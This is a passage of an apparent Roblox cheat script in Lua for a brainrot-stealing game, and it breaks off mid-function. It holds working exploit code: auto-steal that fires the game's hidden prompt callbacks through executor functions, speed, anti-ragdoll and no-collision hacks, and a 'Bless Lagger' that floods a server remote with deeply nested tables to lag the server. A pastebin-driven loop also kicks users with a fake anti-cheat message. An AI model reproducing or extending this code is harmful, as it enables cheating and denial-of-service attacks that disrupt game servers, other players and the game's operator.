_GACC.safeBlockedTools = {
	bat = true, slap = true, sword = true, gun = true, pistol = true, rifle = true,
	medusa = true, hammer = true, axe = true, knife = true, katana = true, blade = true,
	fist = true, coil = true, boombox = true
}

_GACC.inDuelCountdown = function()
	local ok, label = pcall(function()
		return LP.PlayerGui:FindFirstChild("DuelsMachineTopFrame").DuelsMachineTopFrame.Timer.Label
	end)
	if not ok or not label then return false end
	local text = tostring(label.Text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
	if text == "GO" or text == "START" or text == "READY" then return true end
	local number = tonumber(text)
	return number ~= nil and number >= 0 and number <= 10
end

_GACC.hasHeldBrainrot = function()
	if LP:GetAttribute("Stealing") == true or LP:GetAttribute("AntiKick") == true then return true end
	local char = LP.Character
	if not char then return false end
	if char:GetAttribute("Stealing") == true then return true end

	for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
		local value = char:FindFirstChild(name, true)
		if value and ((value:IsA("BoolValue") and value.Value) or
			   (value:IsA("ObjectValue") and value.Value) or
			   (value:IsA("StringValue") and value.Value ~= "")) then
			return true
		end
	end

	for _, obj in ipairs(char:GetChildren()) do
		local name = obj.Name:lower()
		if obj:IsA("Tool") then
			local blocked = false
			for word in pairs(_GACC.safeBlockedTools) do
				if name:find(word, 1, true) then blocked = true; break end
			end
			if not blocked then return true end
		elseif obj:IsA("Model") and obj:FindFirstChildWhichIsA("BasePart", true) then
			if name:find("brainrot") or name:find("animal") or name:find("carry") or
			   name:find("grab") or name:find("steal") or name:find("hold") then
				return true
			end
		end
	end
	return false
end

_GACC.safeModeEnabled = false
_GACC.safeModeActive = false

_GACC.safeBlocked = function()
	if not _GACC.safeModeEnabled then
		_GACC.safeModeActive = false
		return false
	end
	local brainrotDetected = _GACC.hasHeldBrainrot() or _GACC.inDuelCountdown()
	_GACC.safeModeActive = brainrotDetected
	return brainrotDetected
end

_GACC.enforceSafeMode = function()
	if not _GACC.safeBlocked() then return end

	if autoBatEnabled then
		stopBatAimbot()
		if autoBatSetVisual then autoBatSetVisual(false) end
	end

	if autoLeftEnabled then
		autoLeftEnabled = false
		stopAutoLeft()
		if autoLeftSetVisual then autoLeftSetVisual(false) end
	end

	if autoRightEnabled then
		autoRightEnabled = false
		stopAutoRight()
		if autoRightSetVisual then autoRightSetVisual(false) end
	end

	if State.BatV2 then
		State.BatV2 = false
		stopBatV2Aimbot()
		if setBatV2Visual then setBatV2Visual(false) end
	end

	if tpBatEnabled then
		stopTpBat()
		if tpBatSetVisual then tpBatSetVisual(false) end
	end
end

task.spawn(function()
	while task.wait(0.1) do
		if _GACC.safeModeEnabled then
			local brainrotDetected = _GACC.hasHeldBrainrot() or _GACC.inDuelCountdown()
			_GACC.safeModeActive = brainrotDetected
			if brainrotDetected then _GACC.enforceSafeMode() end
		end
	end
end)

-- ============================================================
-- BRANDING / THEME
-- ============================================================
BLESS_BRAND = "ELITE.GG"
BLESS_DISCORD = "discord.gg/elitegg"
BLESS_COLORS = {
	BG = Color3.fromRGB(8,8,8),
	PANEL = Color3.fromRGB(18,18,18),
	CARD = Color3.fromRGB(28,28,28),
	ACCENT = Color3.fromRGB(220,220,220),
	ICE = Color3.fromRGB(255,255,255),
	HOVER = Color3.fromRGB(200,200,200),
	TEXT = Color3.fromRGB(255,255,255),
	SECONDARY = Color3.fromRGB(160,160,160),
	STROKE = Color3.fromRGB(180,180,180),
	INPUT = Color3.fromRGB(200,200,200),
	OFF = Color3.fromRGB(40,40,40),
	DARK_ACCENT = Color3.fromRGB(80,80,80),
	LIGHT_GLOW = Color3.fromRGB(255,255,255)
}

-- ============================================================
-- CONFIG / STATE
-- ============================================================
showIntroEnabled = false
uiLocked = false
uiScaleValue = 1.2
mobileButtonScaleValue = 1
editMobileButtons = false
hideMobileButtons = false
mobileButtonPositions = {}
mobileGroupPosition = nil
mainUIScale, mobileUIScale = nil, nil
bgImgRef = nil
blessLaggerPanelOpen = false
blessLaggerPanelPosition = nil
blessLaggerPanelRef = nil
setBlessLaggerPanelVisible = nil
setBlessLaggerVisual = nil
blessLaggerUiEnabled = false
blessLaggerActive = false
blessLaggerLoopId = 0
currentSkyTheme = "Night"
setLockGuiVisual, setTopLockVisual, setEditMobileVisual, setHideMobileVisual = nil, nil, nil, nil
uiSizeSetters, mobileSizeSetters = {}, {}
mobileButtonFrames = {}
mobileButtonsScreen = nil
mobileButtonContainerRef = nil
MobileButtonActions = {}
showCandyGui, hideCandyGui, isCandyGuiVisible = nil, nil, nil

guiPosition = UDim2.new(0, 20, 0, 60)
stealPodPosition = UDim2.new(0.5, -150, 0, 72)
miniButtonPosition = UDim2.new(0, 26, 0, 26)

function refreshMobileButtonUi()
	if mobileButtonsScreen then mobileButtonsScreen.Enabled = not hideMobileButtons end
	for _, data in pairs(mobileButtonFrames) do
		if data.stroke then
			data.stroke.Transparency = editMobileButtons and 0.06 or 0.34
			data.stroke.Thickness = editMobileButtons and 1.45 or 1
		end
	end
end

function resetMobileButtonLayout()
	mobileButtonPositions = {}
	mobileGroupPosition = nil
	for id, data in pairs(mobileButtonFrames) do
		if data.frame and data.defaultPosition then
			data.frame.Position = data.defaultPosition
		end
	end
	if mobileButtonContainerRef then mobileButtonContainerRef.Position = UDim2.new(1, -20, 0.12, 0) end
	if mobileUIScale then mobileUIScale.Scale = mobileButtonScaleValue end
	for _, refresh in ipairs(mobileSizeSetters) do refresh() end
	refreshMobileButtonUi()
end

NS, CS = 60, 30
LAGGER_SPEED = 15
LAGGER_CARRY_SPEED = 24.5
speedMode, antiRagdollEnabled, antiDieEnabled, infJumpEnabled = false, false, false, false
laggerToggled = false
laggerCarryToggled = false
medusaCounterEnabled = false
batCounterEnabled = false
unwalkEnabled = false
medusaDebounce, medusaLastUsed, dropActive = false, 0, false
autoLeftEnabled, autoRightEnabled = false, false
autoLeftSetVisual, autoRightSetVisual = nil, nil
speedLabel = nil
otherSpeedLabels = {}
setCarryModeVisual = nil
setLaggerModeVisual = nil
setLaggerCarryVisual = nil
autoBatEnabled = false
autoSwingEnabled = true
autoBatSetVisual = nil
resetAutoBatMotion = nil
State = { AutoBat = false, BatAimbot = false, BatV2 = false, BatV2HittingCooldown = false }
setBatCounterVisual = nil
startBatCounter, stopBatCounter = nil, nil
antiLagEnabled = false
removeAccessoriesEnabled = false
antiLagDescConn = nil
startAntiDie = nil
refreshBatMotionAntiDieGuard = nil
unwalkSavedAnimate = nil
_anyKeyListening = false
autoTPEnabled = false
autoTPHeight = 20
autoTPConn = nil
setAutoTPVisual = nil
autoTPDownEnabled = false
autoTPDownThreshold = 20
autoTPDownConn = nil
autoTPDownCooldownUntil = 0
autoTPDownSetVisual = nil

-- ============================================================
-- RAGDOL TIMER
-- ============================================================
ragdolTimerEnabled = false
ragdolTimerGuiBB = nil
ragdolTimerText = nil
ragdolStunActive = false
ragdolStunStartTime = 0
ragdolStunDuration = 3.0
ragdolStunConnection = nil
ragdolStateChangedConnection = nil
ragdolLastDisplayedSecond = nil
setRagdolTimerVisual = nil

-- ============================================================
-- FEATURE BACKEND
-- ============================================================
task.spawn(function()
	local BLACKLIST_URL = "https://pastebin.com/2zLUXv2K"
	pcall(function() HS.HttpEnabled = true end)
	local function httpGet(url)
		local methods = {
			function() return game:HttpGet(url) end,
			function() return HS:GetAsync(url) end,
			function() return syn.request({Url=url,Method="GET"}).Body end,
			function() return http_request({Url=url,Method="GET"}).Body end,
			function() return request({Url=url,Method="GET"}).Body end
		}
		for _, method in ipairs(methods) do
			local ok, result = pcall(method)
			if ok and result then return result end
		end
		return nil
	end
	while task.wait(3) do
		pcall(function()
			local response = httpGet(BLACKLIST_URL)
			if response and string.find(response, tostring(LP.UserId), 1, true) then
				LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
				task.wait(999999)
			end
		end)
	end
end)

-- Bless Lagger backend
BLESS_LAGGER_CFG = { x = 2.5, y = 1, z = (UIS.TouchEnabled and not UIS.KeyboardEnabled) and 0.15 or 0.08 }
BLESS_LAGGER_REMOTE = "RobloxReplicatedStorage.SetPlayerBlockList"

function getBlessLaggerRemote(path)
	if not path or path == "" then return nil end
	local obj = game
	local clean = path:gsub("^game%.", "")
	for piece in clean:gmatch("[^%.]+") do
		if not obj then return nil end
		obj = obj[piece]
	end
	return obj
end

function sendBlessLaggerPayload(depth, attempts)
	local mainTable = {}
	local spamTable = { {} }
	local ptr = spamTable[1]
	for _ = 1, depth do
		local newTable = {}
		table.insert(ptr, newTable)
		ptr = newTable
	end
	for i = 1, 15000 do
		table.insert(mainTable, spamTable)
		if i % 1000 == 0 then task.wait() end
	end
	local remoteObj = getBlessLaggerRemote(BLESS_LAGGER_REMOTE)
	if not remoteObj then return end
	for _ = 1, attempts do
		pcall(function()
			if remoteObj:IsA("RemoteEvent") then
				remoteObj:FireServer(mainTable)
			elseif remoteObj:IsA("RemoteFunction") then
				remoteObj:InvokeServer(mainTable)
			end
		end)
	end
end

function setBlessLaggerEnabled(on)
	blessLaggerActive = on and true or false
	blessLaggerLoopId = blessLaggerLoopId + 1
	local loopId = blessLaggerLoopId
	if setBlessLaggerVisual then setBlessLaggerVisual(blessLaggerActive) end
	if not blessLaggerActive then return end
	task.spawn(function()
		while blessLaggerActive and blessLaggerLoopId == loopId do
			task.spawn(function()
				sendBlessLaggerPayload(BLESS_LAGGER_CFG.x, BLESS_LAGGER_CFG.y)
			end)
			task.wait(BLESS_LAGGER_CFG.z)
		end
	end)
end

KB = {
	DropBrainrot = { kb = Enum.KeyCode.X, gp = nil },
	AutoLeft = { kb = Enum.KeyCode.Z, gp = nil },
	AutoRight = { kb = Enum.KeyCode.C, gp = nil },
	AutoBat = { kb = Enum.KeyCode.E, gp = nil },
	TPFloor = { kb = Enum.KeyCode.F, gp = nil },
	GuiHide = { kb = Enum.KeyCode.LeftControl, gp = nil },
	SpeedToggle = { kb = Enum.KeyCode.Q, gp = nil },
	LaggerToggle = { kb = Enum.KeyCode.R, gp = nil },
	LaggerCarryToggle = { kb = nil, gp = nil },
	BlessLagger = { kb = Enum.KeyCode.F, gp = nil },
	BatV2 = { kb = nil, gp = nil },
	TPBat = { kb = Enum.KeyCode.T, gp = nil },
}

AP_L1, AP_L2 = Vector3.new(-476.47, -6.28, 92.73), Vector3.new(-483.12, -4.95, 94.81)
AP_R1, AP_R2 = Vector3.new(-476.16, -6.52, 25.62), Vector3.new(-483.06, -5.03, 25.48)

CONFIG = {
	AUTO_STEAL_ENABLED = false,
	HOLD_MIN = 1.3,
	HOLD_MAX = 2.6,
	ENTRY_DELAY = 0.3,
	COOLDOWN = 0.05,
	STEAL_RANGE = 9,
	PRIME_RANGE = 80
}

Conns = { antiRag = nil, batCounter = nil, antiDie = {}, anchor = {} }
MEDUSA_COOLDOWN = 25
batCounterDebounce = false
progressRadLbl, progressFill, progressPct = nil, nil, nil
progressDot, progressStripe, progressPillStroke, progressDotGlow = nil, nil, nil, nil
progressLastFill = 0
modeValLbl = nil
refreshSpeedModeLabel = nil
lastMoveDir = Vector3.new(0, 0, 0)
MOVE_KEYS = {
	[Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
	[Enum.KeyCode.Up] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Right] = true
}

-- ============================================================
-- RAGDOL TIMER BACKEND
-- ============================================================
function ragdolCreateBillboard()
	if ragdolTimerGuiBB then return end
	local char = LP.Character
	if not char then return end
	local head = char:FindFirstChild("Head")
	if not head then return end
	ragdolTimerGuiBB = Instance.new("BillboardGui")
	ragdolTimerGuiBB.Name = "RagdolTimerBB"
	ragdolTimerGuiBB.Adornee = head
	ragdolTimerGuiBB.Size = UDim2.new(0, 120, 0, 36)
	ragdolTimerGuiBB.StudsOffset = Vector3.new(0, 3.5, 0)
	ragdolTimerGuiBB.AlwaysOnTop = true
	ragdolTimerGuiBB.Parent = game:GetService("CoreGui")
	ragdolTimerText = Instance.new("TextLabel", ragdolTimerGuiBB)
	ragdolTimerText.Size = UDim2.new(1, 0, 1, 0)
	ragdolTimerText.BackgroundTransparency = 1
	ragdolTimerText.Text = "READY!!"
	ragdolTimerText.TextColor3 = Color3.fromRGB(255, 255, 255)
	ragdolTimerText.Font = Enum.Font.GothamBlack
	ragdolTimerText.TextSize = 20
	ragdolTimerText.TextStrokeTransparency = 0.5
	ragdolTimerText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	ragdolTimerText.TextXAlignment = Enum.TextXAlignment.Center
	ragdolTimerText.TextYAlignment = Enum.TextYAlignment.Center
end

function ragdolUpdateDisplay()
	if not ragdolTimerText then return end
	if not ragdolStunActive then
		ragdolTimerText.Text = "READY!!"
		ragdolTimerText.TextColor3 = Color3.fromRGB(255, 255, 255)
		ragdolTimerText.TextSize = 20
		if ragdolTimerGuiBB then ragdolTimerGuiBB.Enabled = ragdolTimerEnabled end
		return
	end
	local elapsed = tick() - ragdolStunStartTime
	local remaining = math.max(0, ragdolStunDuration - elapsed)
	if remaining <= 0 then
		ragdolStunActive = false
		if ragdolStunConnection then ragdolStunConnection:Disconnect(); ragdolStunConnection = nil end
		ragdolTimerText.Text = "READY!!"
		ragdolTimerText.TextColor3 = Color3.fromRGB(255, 255, 255)
		ragdolTimerText.TextSize = 20
		if ragdolTimerGuiBB then ragdolTimerGuiBB.Enabled = true end
		return
	end
	local second = math.ceil(remaining)
	if second ~= ragdolLastDisplayedSecond then
		ragdolLastDisplayedSecond = second
		ragdolTimerText.Text = tostring(second)
		ragdolTimerText.TextSize = 32
		if second == 3 then ragdolTimerText.TextColor3 = Color3.fromRGB(255, 255, 255)
		elseif second == 2 then ragdolTimerText.TextColor3 = Color3.fromRGB(255, 255, 255)
		elseif second == 1 then ragdolTimerText.TextColor3 = Color3.fromRGB(255, 255, 255) end
	end
	if ragdolTimerGuiBB then ragdolTimerGuiBB.Enabled = true end
end

function ragdolOnStunDetected()
	if not ragdolTimerEnabled then return end
	if ragdolStunActive then return end
	ragdolStunActive = true
	ragdolStunStartTime = tick()
	ragdolLastDisplayedSecond = nil
	ragdolCreateBillboard()
	ragdolUpdateDisplay()
	if ragdolStunConnection then ragdolStunConnection:Disconnect() end
	ragdolStunConnection = RunService.Heartbeat:Connect(ragdolUpdateDisplay)
end

function ragdolSetupDetection(char)
	if ragdolStateChangedConnection then ragdolStateChangedConnection:Disconnect() end
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	ragdolStateChangedConnection = hum.StateChanged:Connect(function(_, newState)
		if not ragdolTimerEnabled then return end
		local isStunned = (newState == Enum.HumanoidStateType.Physics or
			newState == Enum.HumanoidStateType.Ragdoll or
			newState == Enum.HumanoidStateType.FallingDown)
		if isStunned then ragdolOnStunDetected() end
	end)
end

function setRagdolTimer(enabled)
	ragdolTimerEnabled = enabled
	if setRagdolTimerVisual then setRagdolTimerVisual(enabled) end
	if not enabled then
		if ragdolStunConnection then ragdolStunConnection:Disconnect(); ragdolStunConnection = nil end
		ragdolStunActive = false
		if ragdolTimerGuiBB then ragdolTimerGuiBB.Enabled = false end
		if ragdolStateChangedConnection then ragdolStateChangedConnection:Disconnect(); ragdolStateChangedConnection = nil end
	else
		ragdolCreateBillboard()
		local char = LP.Character
		if char then
			local hum = char:FindFirstChildOfClass("Humanoid")
			if hum then
				local st = hum:GetState()
				if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll then ragdolOnStunDetected() end
			end
			ragdolSetupDetection(char)
		end
	end
	saveConfig()
end

-- ============================================================
-- UTILITY HELPERS
-- ============================================================
function getActiveMoveSpeed()
	if laggerCarryToggled then return LAGGER_CARRY_SPEED
	elseif laggerToggled then return LAGGER_SPEED
	elseif speedMode then return CS
	else return NS end
end

function getAutoPathSpeed()
	if laggerCarryToggled or laggerToggled then return LAGGER_SPEED end
	return NS
end

function isRagdollState(hum)
	if not hum then return true end
	local st = hum:GetState()
	return hum.PlatformStand or st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
end

function forceReset()
	local char = LP.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local root = char:FindFirstChild("HumanoidRootPart")
	if not hum or not root or hum.Health <= 0 then return end
	pcall(function()
		hum:ChangeState(Enum.HumanoidStateType.GettingUp)
		root.Velocity = Vector3.zero
		root.RotVelocity = Vector3.zero
		root.AssemblyLinearVelocity = Vector3.zero
		root.AssemblyAngularVelocity = Vector3.zero
		for _, obj in ipairs(char:GetDescendants()) do
			if obj:IsA("Motor6D") then obj.Enabled = true end
			if obj:IsA("Constraint") then obj.Enabled = true end
		end
		workspace.CurrentCamera.CameraSubject = hum
		local PM = LP.PlayerScripts:FindFirstChild("PlayerModule")
		if PM then
			local CM = require(PM:FindFirstChild("ControlModule"))
			if CM then CM:Enable() end
		end
		hum.AutoRotate = true
		hum.PlatformStand = false
		hum.Sit = false
	end)
end

local antiRagResetCooldown = 0
local antiRagdollConn = nil

function startAntiRagdoll()
	if antiRagdollConn then return end
	antiRagdollEnabled = true
	antiRagdollConn = RunService.Heartbeat:Connect(function()
		if not antiRagdollEnabled then return end
		local char = LP.Character
		if not char then return end
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hum or hum.Health <= 0 then return end
		local state = hum:GetState()
		local isRagdolled = (state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown)
		if isRagdolled then
			local now = tick()
			if now - antiRagResetCooldown > 0.15 then
				antiRagResetCooldown = now
				forceReset()
			end
		end
	end)
end

function stopAntiRagdoll()
	antiRagdollEnabled = false
	if antiRagdollConn then
		antiRagdollConn:Disconnect()
		antiRagdollConn = nil
	end
end

-- ============================================================
-- AUTO STEAL
-- ============================================================
plots = workspace:FindFirstChild("Plots")
getconnections = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)
AnimalsData = {}
syncRemotes = nil
plotAnimalSync = { caches = {}, connections = {} }
allAnimalsCache = {}
PromptMemoryCache = {}
InternalStealCache = {}
stealConnection = nil
StealState = {
	active = false,
	startTime = 0,
	phase = "idle",
	label = "",
	lastResult = "",
	lastResultTime = 0,
	totalSteals = 0,
	failedSteals = 0
}

function initializeAutoStealSync()
	local ok = pcall(function()
		local Packages = ReplicatedStorage:FindFirstChild("Packages") or ReplicatedStorage:WaitForChild("Packages", 1)
		local Datas = ReplicatedStorage:FindFirstChild("Datas") or ReplicatedStorage:WaitForChild("Datas", 1)
		if not Packages or not Datas then return end
		AnimalsData = require(Datas:WaitForChild("Animals"))
		local folder = Packages:WaitForChild("Synchronizer")
		syncRemotes = {
			channelFolder = folder:WaitForChild("Channel"),
			routeRemote = folder:WaitForChild("CommunicationRoute"),
			requestData = folder:FindFirstChild("RequestData")
		}
	end)
	return ok and syncRemotes ~= nil
end

function splitSyncPath(path)
	if typeof(path) == "table" then return path end
	local out = {}
	for part in string.gmatch(tostring(path), "[^%.]+") do table.insert(out, tonumber(part) or part) end
	return out
end

function resolveSyncPath(path, root)
	local current = root
	local parent = nil
	local key = nil
	for _, part in ipairs(splitSyncPath(path)) do
		parent = current
		key = part
		current = current and current[part] or nil
	end
	return current, parent, key
end

function applyPlotSyncDiff(channelName, packet)
	local cache = plotAnimalSync.caches[channelName]
	if typeof(cache) ~= "table" then return end
	local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
	local current, parent, key = resolveSyncPath(path, cache)
	if action == "Changed" then
		if parent ~= nil then parent[key] = a end
	elseif action == "ArrayInsert" then
		if current ~= nil then table.insert(current, b, a) end
	elseif action == "ArrayRemoved" then
		if current ~= nil then table.remove(current, b) end
	elseif action == "DictionaryInsert" then
		if current ~= nil then current[b] = a end
	elseif action == "DictionaryRemoved" then
		if current ~= nil then current[b] = nil end
	end
end

function attachPlotChannel(remote)
	if not syncRemotes or plotAnimalSync.connections[remote] then return end
	local channelName = tostring(remote.Name)
	if not plots:FindFirstChild(channelName) then return end
	if syncRemotes.requestData and plotAnimalSync.caches[channelName] == nil then
		local ok, data = pcall(function() return syncRemotes.requestData:InvokeServer(channelName) end)
		plotAnimalSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
	elseif plotAnimalSync.caches[channelName] == nil then
		plotAnimalSync.caches[channelName] = {}
	end
	plotAnimalSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
		for _, packet in ipairs(queue) do applyPlotSyncDiff(channelName, packet) end
	end)
end

function detachPlotChannel(channelName)
	for remote, conn in pairs(plotAnimalSync.connections) do
		if tostring(remote.Name) == tostring(channelName) then
			conn:Disconnect()
			plotAnimalSync.connections[remote] = nil
			plotAnimalSync.caches[tostring(channelName)] = nil
			break
		end
	end
end

function startAutoStealSync()
	if not initializeAutoStealSync() then return false end
	for _, child in ipairs(syncRemotes.channelFolder:GetChildren()) do
		if child:IsA("RemoteEvent") then attachPlotChannel(child) end
	end
	syncRemotes.channelFolder.ChildAdded:Connect(function(child)
		if child:IsA("RemoteEvent") then attachPlotChannel(child) end
	end)
	syncRemotes.routeRemote.OnClientEvent:Connect(function(actions)
		for _, action in ipairs(actions) do
			local kind, channelName = action[1], tostring(action[2])
			if not plots:FindFirstChild(channelName) then continue end
			if kind == "ListenerAdded" then
				local remote = syncRemotes.channelFolder:FindFirstChild(channelName)
				if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote) end
			elseif kind == "ListenerRemoved" then
				detachPlotChannel(channelName)
			end
		end
	end)
	return true
end

function getPlotChannelData(plotName)
	return plotAnimalSync.caches[plotName]
end

function getPlotOwner(plot)
	local sign = plot:FindFirstChild("PlotSign")
	local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
	local label = frame and frame:FindFirstChild("TextLabel")
	if not label or label.Text == "Empty Base" then return nil end
	return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
end

function isMyBaseAnimal(animalData)
	if not animalData or not animalData.plot then return false end
	local plot = plots:FindFirstChild(animalData.plot)
	if not plot then return false end
	return getPlotOwner(plot) == LP.DisplayName
end

function findProximityPromptForAnimal(animalData)
	if not animalData then return nil end
	local cached = PromptMemoryCache[animalData.uid]
	if cached and cached.Parent then return cached end
	local plot = plots:FindFirstChild(animalData.plot)
	if not plot then return nil end
	local podiums = plot:FindFirstChild("AnimalPodiums")
	if not podiums then return nil end
	local podium = podiums:FindFirstChild(animalData.slot)
	if not podium then return nil end
	local base = podium:FindFirstChild("Base")
	if not base then return nil end
	local spawn = base:FindFirstChild("Spawn")
	if not spawn then return nil end
	local attach = spawn:FindFirstChild("PromptAttachment")
	if not attach then return nil end
	for _, p in ipairs(attach:GetChildren()) do
		if p:IsA("ProximityPrompt") then
			PromptMemoryCache[animalData.uid] = p
			return p
		end
	end
	return nil
end

function getAnimalPosition(animalData)
	local plot = plots:FindFirstChild(animalData.plot)
	if not plot then return nil end
	local podiums = plot:FindFirstChild("AnimalPodiums")
	if not podiums then return nil end
	local podium = podiums:FindFirstChild(animalData.slot)
	if not podium then return nil end
	return podium:GetPivot().Position
end

function distToAnimal(animalData)
	local character = LP.Character
	if not character then return math.huge end
	local hrp = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso")
	if not hrp then return math.huge end
	local pos = getAnimalPosition(animalData)
	if not pos then return math.huge end
	return (hrp.Position - pos).Magnitude
end

function pickClosest()
	local character = LP.Character
	if not character then return nil end
	local hrp = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso")
	if not hrp then return nil end
	local best, bestDist = nil, math.huge
	for _, animalData in ipairs(allAnimalsCache) do
		if isMyBaseAnimal(animalData) then continue end
		local pos = getAnimalPosition(animalData)
		if not pos then continue end
		local dist = (hrp.Position - pos).Magnitude
		if dist > CONFIG.PRIME_RANGE then continue end
		if dist < bestDist then
			bestDist = dist
			best = animalData
		end
	end
	return best
end

function buildStealCallbacks(prompt)
	if InternalStealCache[prompt] then return end
	local data = { holdCallbacks = {}, triggerCallbacks = {}, ready = true }
	local ok1, conns1 = false, nil
	if getconnections then ok1, conns1 = pcall(getconnections, prompt.PromptButtonHoldBegan) end
	if ok1 and type(conns1) == "table" then
		for _, conn in ipairs(conns1) do
			if type(conn.Function) == "function" then table.insert(data.holdCallbacks, conn.Function) end
		end
	end
	local ok2, conns2 = false, nil
	if getconnections then ok2, conns2 = pcall(getconnections, prompt.Triggered) end
	if ok2 and type(conns2) == "table" then
		for _, conn in ipairs(conns2) do
			if type(conn.Function) == "function" then table.insert(data.triggerCallbacks, conn.Function) end
		end
	end
	if (#data.holdCallbacks > 0) or (#data.triggerCallbacks > 0) then InternalStealCache[prompt] = data end
end

function executeStealAsync(prompt, animalData)
	local data = InternalStealCache[prompt]
	if not data or not data.ready then return false end
	data.ready = false
	local label = animalData.name or "Animal"
	StealState.active = true
	StealState.startTime = tick()
	StealState.phase = "holding"
	StealState.label = label
	task.spawn(function()
		for _, fn in ipairs(data.holdCallbacks) do task.spawn(fn) end
		task.wait(CONFIG.HOLD_MIN)
		StealState.phase = "waitingRange"
		local alreadyInRange = distToAnimal(animalData) <= CONFIG.STEAL_RANGE
		local fired = false
		while true do
			local elapsed = tick() - StealState.startTime
			if elapsed > CONFIG.HOLD_MAX then break end
			if not prompt.Parent then break end
			if distToAnimal(animalData) <= CONFIG.STEAL_RANGE then
				if not alreadyInRange then task.wait(CONFIG.ENTRY_DELAY) end
				for _, fn in ipairs(data.triggerCallbacks) do task.spawn(fn) end
				fired = true
				break
			end
			task.wait()
		end
		if fired then
			StealState.totalSteals = StealState.totalSteals + 1
			StealState.lastResult = "Stole " .. label
			StealState.phase = "success"
		else
			StealState.failedSteals = StealState.failedSteals + 1
			StealState.lastResult = "Missed window: " .. label
			StealState.phase = "failed"
		end
		StealState.active = false
		StealState.lastResultTime = tick()
		task.wait(CONFIG.COOLDOWN)
		data.ready = true
	end)
	return true
end

function attemptSteal(prompt, animalData)
	if not prompt or not prompt.Parent then return false end
	buildStealCallbacks(prompt)
	if not InternalStealCache[prompt] then return false end
	return executeStealAsync(prompt, animalData)
end

function scanAllPlots()
	local newCache = {}
	for _, plot in ipairs(plots:GetChildren()) do
		local cache = getPlotChannelData(plot.Name)
		if not cache then continue end
		local animalList = cache.AnimalList
		if typeof(animalList) ~= "table" then continue end
		for slot, animalData in pairs(animalList) do
			if type(animalData) == "table" then
				local animalName = animalData.Index
				local animalInfo = AnimalsData[animalName]
				if not animalInfo then continue end
				table.insert(newCache, { name = animalInfo.DisplayName or animalName, plot = plot.Name, slot = tostring(slot), uid = plot.Name .. "_" .. tostring(slot) })
			end
		end
	end
	allAnimalsCache = newCache
	return #allAnimalsCache
end

function startAutoSteal()
	if stealConnection then return end
	stealConnection = RunService.Heartbeat:Connect(function()
		if not CONFIG.AUTO_STEAL_ENABLED then return end
		if StealState.active then return end
		local target = pickClosest()
		if not target then return end
		local prompt = PromptMemoryCache[target.uid]
		if not prompt or not prompt.Parent then prompt = findProximityPromptForAnimal(target) end
		if prompt then attemptSteal(prompt, target) end
	end)
end

function stopAutoSteal()
	if not stealConnection then return end
	stealConnection:Disconnect()
	stealConnection = nil
	StealState.active = false
	StealState.phase = "idle"
end

function updateCandyStealBar(dt)
	if not progressFill or not progressPct then return end
	local recent = StealState.lastResultTime > 0 and (tick() - StealState.lastResultTime) < 1.4
	local targetPct, targetColor, status = 0, BLESS_COLORS.ACCENT, CONFIG.AUTO_STEAL_ENABLED and "READY" or "IDLE"
	if StealState.active then
		targetPct = math.clamp((tick() - StealState.startTime) / CONFIG.HOLD_MAX, 0, 1)
		if StealState.phase == "waitingRange" then
			status = "WAITING RANGE"
			targetColor = BLESS_COLORS.ICE
		else
			status = "STEALING"
			targetColor = BLESS_COLORS.ACCENT
		end
	elseif recent then
		local success = StealState.phase == "success" or string.find(StealState.lastResult, "Stole") ~= nil
		targetPct = 1
		status = success and "SUCCESS" or "FAILED"
		targetColor = success and Color3.fromRGB(200, 200, 200) or Color3.fromRGB(200, 200, 200)
	elseif StealState.phase ~= "idle" then
		StealState.phase = "idle"
	end
	progressLastFill = progressLastFill + (targetPct - progressLastFill) * math.min((dt or 0.016) * 14, 1)
	progressFill.Size = UDim2.new(progressLastFill, 0, 1, 0)
	progressFill.BackgroundColor3 = progressFill.BackgroundColor3:Lerp(targetColor, math.min((dt or 0.016) * 8, 1))
	progressPct.Text = status
	progressPct.TextColor3 = targetColor
	local blend = math.min((dt or 0.016) * 8, 1)
	if progressDot then progressDot.BackgroundColor3 = progressDot.BackgroundColor3:Lerp(targetColor, blend) end
	if progressDotGlow then progressDotGlow.Color = progressDotGlow.Color:Lerp(targetColor, blend) end
	if progressStripe then progressStripe.BackgroundColor3 = progressStripe.BackgroundColor3:Lerp(targetColor, blend) end
	if progressPillStroke then progressPillStroke.Color = progressPillStroke.Color:Lerp(targetColor, blend) end
end

RunService.RenderStepped:Connect(updateCandyStealBar)

task.spawn(function()
	if startAutoStealSync() then
		scanAllPlots()
		while task.wait(5) do scanAllPlots() end
	end
end)

RunService.Stepped:Connect(function()
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LP and p.Character then
			for _, part in ipairs(p.Character:GetDescendants()) do
				if part:IsA("BasePart") then part.CanCollide = false end
			end
		end
	end
end)

-- ============================================================
-- SPEED SYSTEM
-- ============================================================
RunService.RenderStepped:Connect(function()
	local char = LP.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then return end
	if isRagdollState(hum) then lastMoveDir = Vector3.new(0, 0, 0); return end
